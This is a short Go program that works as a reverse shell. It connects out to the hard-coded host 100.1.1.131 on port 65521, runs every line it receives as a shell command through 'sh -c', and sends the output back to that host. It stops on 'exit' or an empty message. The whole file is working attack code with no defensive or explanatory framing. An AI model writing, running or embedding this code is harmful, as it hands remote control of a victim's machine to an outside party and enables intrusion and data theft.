package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, err := net.Dial("tcp", "100.1.1.131:65521")
	if err != nil {
		fmt.Println(err)
		return
	}
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		cmd := exec.Command("sh", "-c", strings.TrimSuffix(message, "\n"))
		out, err := cmd.Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", outputToString(out))

		// 收到 exit 命令或者 Ctrl+C(空)，关闭连接
		if strings.TrimSuffix(message, "\n") == "exit" || message == "" {
			conn.Close()
			return
		}
	}
}

func outputToString(output []byte) string {
	return string(bytes.Trim(output, "\r\n"))
}
